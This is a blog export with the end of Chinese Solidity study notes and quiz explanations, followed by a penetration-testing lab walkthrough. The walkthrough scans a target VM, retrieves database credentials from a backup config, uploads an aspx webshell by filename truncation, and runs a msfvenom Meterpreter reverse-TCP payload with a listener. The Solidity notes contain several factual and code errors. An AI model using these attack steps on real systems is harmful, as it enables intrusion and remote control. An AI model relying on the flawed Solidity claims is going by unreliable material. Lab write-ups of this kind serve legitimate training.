<strong>枚举中的第一个元素</strong></p></li><li><p><strong>address</strong>: 0x0000000000000000000000000000000000000000 (或 address(0))</p></li><li><p><strong>function</strong></p></li><li><ul><li><strong>internal:</strong> <strong>空白函数</strong></li><li><strong>external:</strong> <strong>空白函数</strong></li></ul></li></ul><p><strong>引用类型初始值</strong></p><ul><li><p><strong>映射mapping: 所有元素都为其默认值的mapping</strong></p></li><li><p><strong>结构体struct: 所有成员设为其默认值的结构体</strong></p></li><li><p><strong>数组array</strong></p></li><li><ul><li><strong>动态数组: []</strong></li><li><strong>静态数组（定长）: 所有成员设为其默认值的静态数组</strong></li></ul></li></ul><p>Bytes4 类型表示的是一个固定长度的字节数组，长度为 4 个字节。每个字节由 2 个十六进制字符表示，因此：<br>• 1 字节 &#x3D; 2 个十六进制字符<br>• 4 字节 &#x3D; 4 × 2 &#x3D; 8 个十六进制字符<br>因此，<strong>bytes4类型具有 8 个十六进制位。</strong><br>示例：<br>例如，一个 bytes4 类型的值可能是 0x12345678，这里的 12345678 就是 8 个十六进制字符。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><h4 id="可见性说明符"><a href="#可见性说明符" class="headerlink" title="可见性说明符"></a>可见性说明符</h4><h4 id="pure-view-payable"><a href="#pure-view-payable" class="headerlink" title="pure|view|payable"></a>pure|view|payable</h4><h4 id="函数输出"><a href="#函数输出" class="headerlink" title="函数输出"></a>函数输出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function returnMultiple() public pure returns(uint256, bool, uint256[3] memory) &#123;</span><br><span class="line">   return (1, true, [uint256(1), 2, 5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><span style = "color: blue;">此处memory是什么？</span><br>  是用于指定数据存储位置的关键字。<strong>它标识的是数据在内存中存储，而不是在区块链上永久存储，通常用于临时存储复杂数据类型（如数组或结构体）并在函数执行期间操作它们，执行完毕后释放资源</strong>。具体来说，memory 指定了在函数执行期间，数据只临时存储在内存中，一旦函数执行完毕，内存中的数据就会被释放。<br>  例如此处：uint256[3] memory 中的 memory 指定了数组 [uint256(1), 2, 5] 将在内存中临时存储，而不是在区块链的持久存储（即 storage）中存储。</p><p>  此处代码解析：</p><ul><li>uint256[3] memory: 定义了一个长度为 3 的 uint256 类型数组，并将其存储在内存中。</li><li>[unit256(1),2,5]:<br>• uint256(1)：这个表示法将 1 明确地转换为 uint256 类型。在某些情况下Solidity 可能会自动推断出整数类型为 uint256，但是为了确保类型一致性，可以使用这种显式类型转换。<br>• 2 和 5：这两个值直接写为整数，Solidity会自动将它们识别为 uint256 类型，因它们是未指定类型的字面常量，且默认情况下 Solidity 会将整数推断为 uint256。</li></ul><h2 id="变量数据存储和作用域："><a href="#变量数据存储和作用域：" class="headerlink" title="变量数据存储和作用域："></a>变量数据存储和作用域：</h2><h3 id="1-声明类型"><a href="#1-声明类型" class="headerlink" title="1. 声明类型"></a>1. 声明类型</h3><h4 id="1-1-Solidity数据存储位置"><a href="#1-1-Solidity数据存储位置" class="headerlink" title="1.1 Solidity数据存储位置"></a>1.1 Solidity数据存储位置</h4><pre><code>有三类：storage，memory和calldata。</code></pre><h4 id="1-2-赋值和引用"><a href="#1-2-赋值和引用" class="headerlink" title="1.2 赋值和引用"></a>1.2 赋值和引用</h4><h4 id="1-3常数-constant和immutable"><a href="#1-3常数-constant和immutable" class="headerlink" title="1.3常数 constant和immutable"></a><strong>1.3常数 constant和immutable</strong></h4><p><span style="color: red;"><strong>只有数值变量可以声明constant和immutable；string和bytes可以声明为constant，但不能为immutable</strong></span></p><ul><li><strong>constant变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过</strong></li><li><strong>immutable变量可以在声明时或构造函数中初始化</strong></li><li><strong>immutable变量既在声明时初始化，又在constructor中初始化，会使用constructor初始化的值。</strong></li></ul><h3 id="2-作用域"><a href="#2-作用域" class="headerlink" title="2. 作用域"></a>2. 作用域</h3><h4 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h4><h4 id="2-2"><a href="#2-2" class="headerlink" title="2.2"></a>2.2</h4><h3 id="2-3全局变量"><a href="#2-3全局变量" class="headerlink" title="2.3全局变量"></a>2.3全局变量</h3><h4 id="2-3-1以太单位-时间单位"><a href="#2-3-1以太单位-时间单位" class="headerlink" title="2.3.1以太单位&amp;时间单位"></a>2.3.1以太单位&amp;时间单位</h4><h3 id="2-4引用类型"><a href="#2-4引用类型" class="headerlink" title="2.4引用类型"></a>2.4引用类型</h3><h4 id="2-4-1数组"><a href="#2-4-1数组" class="headerlink" title="2.4.1数组"></a>2.4.1数组</h4><p>分为：<br>固定数组；<br>可变数组；<br>（bytes比较特殊，是数组，但是不用加[]另外，不能用byte[]声明单字节数组，可以使用bytes或bytes1[]。bytes比bytes1[]省gas。</p><p><strong>创建数组的规则</strong><br>对于memory修饰的动态数组，可以用new操作符号来创建，但是必须声明长度，并且声明后长度不能改变。</p><p>eg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// memory动态数组</span><br><span class="line">uint[] memory array8 = new uint[](5);</span><br><span class="line">bytes memory array9 = new bytes(9);</span><br></pre></td></tr></table></figure><p>如果创建的是动态数组，需要一个一个元素的赋值。</p><p><strong>数组成员</strong></p><ul><li><strong>length</strong>: 数组有一个包含元素数量的<strong>length</strong>成员，<strong>memory</strong>数组的长度在创建后是固定的。</li><li><strong>push()</strong>: <strong>动态数组</strong>拥有<strong>push()<strong>成员，可以在数组最后添加一个</strong>0</strong>元素，并返回该元素的引用。</li><li><strong>push(x)</strong>: <strong>动态数组</strong>拥有<strong>push(x)<strong>成员，可以在数组最后添加一个</strong>x</strong>元素。</li><li><strong>pop()</strong>: <strong>动态数组</strong>拥有**pop()**成员，可以移除数组最后一个元素（与数据结构的栈相同）</li></ul><h4 id="2-4-2结构体"><a href="#2-4-2结构体" class="headerlink" title="2.4.2结构体"></a>2.4.2结构体</h4><p><strong>创建结构体</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//结构体</span><br><span class="line">struct Student&#123;</span><br><span class="line">uint256 id;</span><br><span class="line">uint256 score;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student student;//初始化一个student结构体</span><br></pre></td></tr></table></figure><p><strong>结构体赋值方法</strong></p><p><em>方法1:在函数中创建一个storage的struct引用</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function initStudent1() external&#123;</span><br><span class="line">Student storage _student = student;</span><br><span class="line">_stdent.id = 11;</span><br><span class="line">_student.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>storage</strong></p><p><em>方法2:直接引用状态变量的struct</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function initStudent2() external&#123;</span><br><span class="line">student.id = 11;</span><br><span class="line">stundet.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>方法3:构造函数式</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function initStudent3() external&#123;</span><br><span class="line">student = Student(11,100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>方法4:key value</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function initStudent4() external&#123;</span><br><span class="line">student = Student(&#123;id: 11,score: 100&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-3印射-（mapping"><a href="#2-4-3印射-（mapping" class="headerlink" title="2.4.3印射 （mapping)"></a>2.4.3印射 （mapping)</h4><p><strong>定义： Solidity中存储键值对的数据结构，可以理解为哈希表</strong></p><p><strong>mapping变量不存长度信息</strong></p><p>在映射中，人们可以<strong>通过键（Key）来查询对应的值（Value）</strong></p><p>比如：通过一个人的id来查询他的钱包地址。</p><p>格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapping(_KeyType =&gt; _ValueType)</span><br></pre></td></tr></table></figure><p>其中_KeyType和_ValueType分别是Key和Value的变量类型</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping(uint =&gt; address) public idToAddress; // id映射到地址</span><br><span class="line">mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址</span><br></pre></td></tr></table></figure><h6 id="映射的规则"><a href="#映射的规则" class="headerlink" title="映射的规则"></a>映射的规则</h6><p><strong>规则1</strong></p><p>映射的_keytype只能选择solidity内置的值类型，比如uint,address等，不能用自定义的结构体，而_Valuetype可以使用自定义的类型（例如：结构体）。</p><p><strong>规则2</strong></p><p>映射的存储位置必须是storage，因此可以用于合约的状态变量，函数中的storage变量和library函数的参数（<a href="https://github.com/ethereum/solidity/issues/4635">例子</a>）。不能用于public函数的参数或返回结果中，因为mapping记录的是一种关系（key-value pair)。</p><p><strong>规则3</strong></p><p>如果映射声明为 public，那么Solidity会自动给你创建一个 getter 函数，可以通过 key 来查询对应的 value 。<br><strong>规则4</strong></p><p>给映射新增的键值对的语法为_var[_Key]&#x3D; _value，其中 _var 是映射变量名，_Key 和_value 对应新增的键值对。</p><p>eg: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function writeMap(uint key,address Value)public&#123;</span><br><span class="line">idToAddress[ Key]= Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>请解释下面这段代码的意思：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">address payable addr;</span><br><span class="line">addr.transfer(1);</span><br></pre></td></tr></table></figure><p>选择一个答案<br>A. 调用者向合约转账1wei<br>B. 调用者向addr转账1wei<br>C. 合约向addr转账1wei<br>D. 合约向addr转账1ether</p><p><strong>解析：</strong></p><ul><li>address payable: 这是一个 payable 地址类型，表示这个地址能够接收以太币（ether）转账。只有 payable 地址才允许进行 transfer() 或 send() 操作。</li><li>addr.transfer(1): 这是一个转账操作，向地址 addr 转账 1 单位的以太币，单位是 wei。在以太坊中，最小的货币单位是 wei，而 1 ether &#x3D; 10^18 wei。因此，这里转账的数额是 1 wei，而不是 1 ether。</li><li>transfer操作是合约向addr转账。<br>正确答案选c</li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>以下关于数组的说法中，正确的是(选择一个答案)</p><p> A. 固定长度数组和bytes拥有push()成员，可以在数组最后添加一个0元素。</p><p> B. 数组字面常数，例如[uint(1),2,3]，需要声明第一个元素的类型，不然默认用存储空间最大的类型</p><p> C. 内存数组的长度在创建后是固定的。 </p><p> D. 对于memory可变长度数组，可以用new操作符来创建，并且不用声明长度，例如uint[] </p><p><strong>解析</strong>：</p><ul><li><p><strong>A. 固定长度数组和 bytes 拥有 push() 成员，可以在数组最后添加一个0元素。</strong><br> 这句话是错误的。<strong>固定长度数组</strong>没有 push() 成员，只有 <strong>可变长度数组</strong>     才有 push() 成员，而 bytes 是可变长度数组，因此 bytes 可以使用 push()，但固定长度数组不能。</p></li><li><p>选项 B 的说法 不正确。原因：<strong>在 Solidity 中，数组字面常量的类型推断并不会自动默认为存储空间最大的类型。</strong>类型推断基于数组字面量中的元素值：对于一个字面量数组，如 [1, 2, 3]，Solidity 会推断这些数字为最小的适当类型。例如，在这种情况下，uint8 就足够了，因为所有数字都能用 8 位来表示，而不会默认推断为 uint256。<strong>只有在数组的元素中存在更大范围的数值时，编译器才会选择相应的更大类型。如果你希望指定一个更大的类型（比如 uint256），需要显式地声明。</strong>因此，数组字面常量中的类型并不会默认使用存储空间最大的类型，而是基于实际的数值大小来推断最适合的类型。</p><p><strong>示例：</strong></p><p>[1, 2, 3] 会推断为 uint8。</p><p>[uint256(1), 2, 3] 才会显式地使用 uint256 进行类型推断。</p></li></ul><p>所以，B 选项的说法是 不正确的。</p><ul><li><p><strong>C. 内存数组的长度在创建后是固定的。</strong></p></li><li><p>D. 这句话是错误的。使用 new 操作符创建内存数组时，必须指定数组的长度，不能省略长度声明。正确的用法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint[] memory array = new uint[](length);</span><br></pre></td></tr></table></figure></li></ul><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>以下关于结构体的说法中，错误的是</p><p>选择一个答案</p><p>A. 通过结构体的形式可以定义新的类型。</p><p>B. 结构体内可以包含字符串，整型等基本数据类型，也可以包含数组，映射，结构体等复杂类型。</p><p>C. 结构体内可以包含其本身。</p><p><strong>解析</strong>：</p><ul><li>A. 这是正确的。结构体在 Solidity 中用于定义新的自定义类型，允许开发者创建更复杂的数据结构。</li><li>B. 这是正确的。结构体可以包含基本数据类型（如 uint、string），也可以包含复杂类型（如数组、映射、其他结构体）。</li><li>C.  这是错误的。在 Solidity 中，结构体不能直接包含其本身，因为这会导致无限嵌套，无法确定内存的大小。不过，结构体可以包含指向其他结构体的     引用，例如使用指针或映射的方式来实现递归关系。</li></ul><p>因此，选项 C 是错误的。</p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p> 在如下的合约中，我们定义了四个 immutable 的变量 y1, y2, y3, y4。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> uint256 immutable y1; </span><br><span class="line"></span><br><span class="line">address immutable y2; </span><br><span class="line"></span><br><span class="line">address immutable y3; </span><br><span class="line"></span><br><span class="line">uint256 immutable y4;</span><br><span class="line"></span><br><span class="line"> constructor (uint256 _y4)&#123; </span><br><span class="line"></span><br><span class="line">y1 = block.number; </span><br><span class="line"></span><br><span class="line">y2 = address(this);</span><br><span class="line"></span><br><span class="line">y3 = msg.sender;</span><br><span class="line"></span><br><span class="line">y4 = _y4; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>其中，确实有必要在构造函数 constructor 中才赋值的一项是： </p><p>A. y1 B. y2 C. y3 D. y4</p><p><strong>解析：</strong></p><ul><li><strong>y4 是通过构造函数参数 _y4 传入的值，因此只有在部署合约时才能确定它的值，这使得它必须在构造函数中赋值。</strong></li></ul><p><strong>其他变量在构造函数外也可以直接赋值，或者它们的值是在合约部署时自动确定的：</strong></p><ul><li><strong>y1：可以在合约外直接赋值为 block.number，表示合约部署时的区块号。</strong></li><li><strong>y2：可以直接设置为 address(this)，即合约自身的地址，在合约部署时自动确定。</strong></li><li><strong>y3：可以直接设置为 msg.sender，即部署合约的地址，也是在合约部署时自动确定的。</strong></li></ul><p><strong>因此，只有 y4 是依赖于构造函数参数，必须在构造函数中进行赋值。选D。</strong></p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p><strong>下面定义变量的语句中，会报错的一项是：</strong> </p><p><strong>A. string constant x5 &#x3D; “hello world”;</strong> </p><p><strong>B. address constant x6 &#x3D; address(0);</strong> </p><p><strong>C. string immutable x7 &#x3D; “hello world”;</strong> </p><p><strong>D. address immutable x8 &#x3D; address(0);</strong></p><p><strong>解析：</strong></p><ul><li><strong>在 Solidity 中，immutable 变量必须在 构造函数中 赋值，而不能在声明时直接赋值。</strong></li></ul><p><strong>具体说明：</strong></p><ul><li>**A. string constant x5 &#x3D; “hello world”;**<strong>：constant 变量必须在声明时赋值，因此这是正确的。</strong></li><li>**B. address constant x6 &#x3D; address(0);**<strong>：constant 变量在声明时赋值是正确的。</strong></li><li>**C. string immutable x7 &#x3D; “hello     world”;**<strong>：这是错误的，因为 immutable 变量不能在声明时赋值，必须在构造函数中进行赋值。</strong></li><li>**D. address immutable x8 &#x3D; address(0);**<strong>：虽然是 immutable 变量，但它的赋值可以在构造函数中完成，定义时不能直接赋值。此处代码如果在构造函数中赋值是正确的。</strong></li></ul><p><strong>因此，选项 C 会报错。</strong></p><p> <strong>ps</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//命名式返回</span><br><span class="line">function returnNamed() public pure returns(uint256_number, bool _bool, uint256[3] memory _array)(</span><br><span class="line">_number = 2;</span><br><span class="line">_bool = false;</span><br><span class="line">_array = [uint256(3),2,1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命名式返回，依然支持return</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function returnNamed2() public pure returns(uint256 _number,bool _bool,unit256[3] memory _arrray)</span><br><span class="line">&#123;</span><br><span class="line"> return(1,true,[unit256(1),2,5]);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li><p>_array 被赋值为 [uint256(3), 2, 1]。这表示它是一个包含三个元素的数组，其中：<br>• 第一个元素是 3（明确类型转换为 uint256）。<br>• 第二个元素是 2（自动推断为 uint256）。<br>• 第三个元素是 1（自动推断为 uint256）。</p></li><li><p>Solidity中不存在小数点，以0代替为小数点，举例<br>在Solidity 中，确实没有内置的浮点数（即小数点），因此所有数字必须使用整数类型来表示。这就需要通过一些技巧来模拟小数点，通常是通过将小数值放大为整数来进行计算。例如，如果要表示金额，可以假设整数中的最低位是 “小数点后的一位” 或更多位，这样就能间接表示小数。<br>例子：<br>假设我们想在 Solidity 中表示货币金额，而没有浮点数。我们可以使用整数表示金额，并通过约定整数的最后几位代表小数部分。常见的方法是<strong>将金额放大 10^18（即使用以太坊中的 wei 单位），将以太作为以太坊中的基本单位</strong>。<br>举例 1: 表示金额<br>假设要表示 1.5 个以太币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint256 public amount = 1.5 * 10**18; // 1.5 Ether 等于 1.5 * 10^18 wei</span><br></pre></td></tr></table></figure><p>• 在这里，我们使用 10^18 来表示一个以太币，因为<strong>1 ether &#x3D; 10^18 wei</strong>。为了表示 1.5 个以太币，我们将 1.5 乘以 10^18，最终得到 1500000000000000000 wei。<br>• 尽管 Solidity 不支持浮点数，但我们通过使用整数和固定的精度来实现。<br>举例 2: 模拟小数点计算<br>假设我们有一个代币，代币的精度是小数点后 2 位。我们可以通过放大 100 倍来处理小数点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint256 public pricePerToken = 150; // 实际上表示 1.50 单位（放大了100倍）</span><br></pre></td></tr></table></figure><p><strong>我们可以通过数学计算来恢复小数点后的值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint256 price = pricePerToken / 100;      // 还原整数部分</span><br><span class="line">uint256 decimals = pricePerToken % 100;   // 取出小数部分</span><br></pre></td></tr></table></figure><p>这样 150 就表示 1.50，即使用整数的 150 来代表 1.50。<br>举例 3: 更高精度<br>如果需要<strong>更多的精度，比如小数点后 6 位，可以通过乘以 10^6 来处理</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint256 public value = 1234567; // 实际表示 1.234567</span><br><span class="line">总结</span><br></pre></td></tr></table></figure><p>在 Solidity 中，通过使用整数来表示带有小数点的值，可以避免精度问题。具体方法是根据需要的精度将小数部分转化为整数进行计算，并在使用时再将其缩放回实际数值。例如，通过乘以 10^18 或 10^6 来模拟 18 位或 6 位的小数。</p></li><li><p>Wei &#x3D; 1</p></li><li><p>Gwei &#x3D; 1e9 &#x3D; 1000000000</p></li><li><p>ether &#x3D; 1e18 &#x3D; 100000000000000000</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【学习笔记】渗透测试过程1</title>
      <link href="/2024/11/06/penetration_testing_steps/"/>
      <url>/2024/11/06/penetration_testing_steps/</url>
      
        <content type="html"><![CDATA[<h2 id="1-设置网络环境"><a href="#1-设置网络环境" class="headerlink" title="1. 设置网络环境"></a>1. 设置网络环境</h2><ul><li><p>将 Kali 虚拟机和靶机的网络适配器改为<strong>桥接模式</strong>。</p></li><li><p>在 Kali 虚拟机和靶机相互 ping 通，确保网络连通性。</p></li><li><p>切换到 <code>root</code> 模式进行操作。</p></li><li><p>Nmap（用于信息收集 资产探测：ip存活、系统、软件、软件版本、端口）</p></li><li><p><strong>扫描网段</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.42.0/24</span><br></pre></td></tr></table></figure><blockquote><p>查看网段中存活的主机。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/rWMvxBAIFEKR2sj.png" alt="1.png"></p></li><li><p><strong>全面扫描靶机</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><blockquote><p>在本实验获取数据库端口（1433）。</p></blockquote></li><li><p><strong>判断系统类型</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><blockquote><p>在 <code>running:</code> 后面查看主机系统信息。</p></blockquote><p>【图片2】</p></li><li><p><strong>服务版本扫描(运行软件）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/wKv9uQmBhrnHEVf.png" alt="3.png"></p></li><li><p><strong>端口扫描</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 (目标端口)&lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/zKij7s6kvE9Nclt.png" alt="4.png"></p></li><li><p><strong>端口 27689 测试</strong>：扫描出异常(unknown）端口，在浏览器访问 <code>&lt;靶机IP&gt;:27689</code>。<br><img src="https://s2.loli.net/2024/11/06/ZXolz7xJqILSc2m.png" alt="5.png"></p></li><li><p><strong>随机 IP 扫描</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -iR(随机) &lt;数量&gt; -Pn -p 80</span><br></pre></td></tr></table></figure><blockquote><p>如果对方开了防火墙——（报）filtered http</p></blockquote></li></ul><h2 id="3-目录结构探测-使用-Dirsearch获取"><a href="#3-目录结构探测-使用-Dirsearch获取" class="headerlink" title="3. 目录结构探测 - 使用 Dirsearch获取"></a>3. 目录结构探测 - 使用 Dirsearch获取</h2><ul><li><p><strong>安装 Dirsearch</strong>，用于获取网站目录结构（取决于字典）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://&lt;靶机IP&gt;:27689/ -I 200,302</span><br></pre></td></tr></table></figure><blockquote><p>200 和 302 表示返回的状态码。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/1QB9OferEtkwIKi.png" alt="6.png"></p></li><li><p><strong>逐步访问上述图片获取的文件</strong>，在浏览器输入 <code>http://&lt;靶机IP&gt;:27689/&lt;文件名&gt;</code>。</p></li><li><p><strong>在访问 <code>web.config.bak</code></strong> 文件，得到数据库信息：</p><ul><li>数据库 IP：192.168.61.144</li><li>数据库名称：FileManage</li><li>用户名：down</li><li>密码：downsql</li></ul><p><img src="https://s2.loli.net/2024/11/06/ADWEqnZHh2kGCrK.png" alt="7.png"></p></li></ul><h2 id="4-数据库连接-使用-Navicat-连接"><a href="#4-数据库连接-使用-Navicat-连接" class="headerlink" title="4. 数据库连接 - 使用 Navicat 连接"></a>4. 数据库连接 - 使用 Navicat 连接</h2><ul><li>下载并安装 Navicat，使用上述数据库信息进行登录。</li><li>若连接不上，可以将 Navicat 通过 FTP 安装到虚拟机。</li></ul><p><img src="https://s2.loli.net/2024/11/06/lJZtYUFH7S8gmAh.png" alt="8.png"></p><h2 id="5-网站管理"><a href="#5-网站管理" class="headerlink" title="5. 网站管理"></a>5. 网站管理</h2><ul><li>回到网站 <code>&lt;靶机IP&gt;:27689</code>，在用户管理模块进行操作。（登入——用户管理——管理用户）</li></ul><p><img src="https://s2.loli.net/2024/11/06/WCcwqFVEDkRtjPZ.png" alt="9.png"></p><h2 id="6-上传一句话木马"><a href="#6-上传一句话木马" class="headerlink" title="6. 上传一句话木马"></a>6. 上传一句话木马</h2><ul><li><p><strong>生成一句话木马文件</strong>，在网站下载管理模块上传文件：</p><p>文件命名为 <code>aaaaaaaaa.aspx.jpg</code>（利用文件名过长被截断的特性，上传后网站删除.jpg）。</p></li></ul><p> <img src="https://s2.loli.net/2024/11/06/opBKA5PW2vECmrj.png" alt="10.png"></p><p>  <strong>上传成功后，一访问就下载：无法解析函数</strong></p><p><img src="https://s2.loli.net/2024/11/06/hSrokxYIA3M9mbW.png" alt="11.png"></p><ul><li><p><strong>获取文件绝对路径</strong>：通过访问不存在的文件查看报错，找到路径 <code>/upfile/affix/</code>。</p><p><img src="https://s2.loli.net/2024/11/06/yjicEPLAVgN49XC.png" alt="12.png"></p></li></ul><h2 id="7-连接木马"><a href="#7-连接木马" class="headerlink" title="7. 连接木马"></a>7. 连接木马</h2><ul><li>使用蚁剑连接上传的 <code>aspx</code> 文件。</li></ul><p><img src="https://s2.loli.net/2024/11/06/vUEJeHn8ab2zCWP.png" alt="13.png"></p><h2 id="8-生成并上传-MSF-木马"><a href="#8-生成并上传-MSF-木马" class="headerlink" title="8. 生成并上传 MSF 木马"></a>8. 生成并上传 MSF 木马</h2><ul><li><p><strong>生成 MSF 木马</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;靶机IP&gt; LPORT=6666 -f exe -o 123.exe</span><br></pre></td></tr></table></figure><blockquote><p>IP 是 Kali 虚拟机的 IP 地址。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/m6qtV2A7cTfrI3x.png" alt="14.png"></p></li><li><p><strong>启动监听器</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST &lt;靶机IP&gt;</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/9zgmlPdetZsCfGH.png" alt="15.png"></p></li></ul><p> <strong>将木马的exe文件从kali复制到主机，然后上传到蚁剑对应位置</strong></p><blockquote><p>（进入&#x2F;web&#x2F;upfile&#x2F;affix&#x2F;，右键上传）</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/B8vSMlg4dXVpGsE.png" alt="16.png"></p><ul><li><p><strong>启动木马文件</strong>：</p><blockquote><p>右键⽊⻢⽂件，打开终端 输⼊如下命令 </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> 123.exe</span><br></pre></td></tr></table></figure><blockquote><p>如果成功，Kali 会成功上线（回到kali终端查看）。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/4eorftv6HnB2cOE.png" alt="17.png"></p><blockquote><p>发现kali成功上线后 可查看到run的执⾏结果（如下图） </p></blockquote><p><img src="https://s2.loli.net/2024/11/06/sypAoLET8I5rSOe.png" 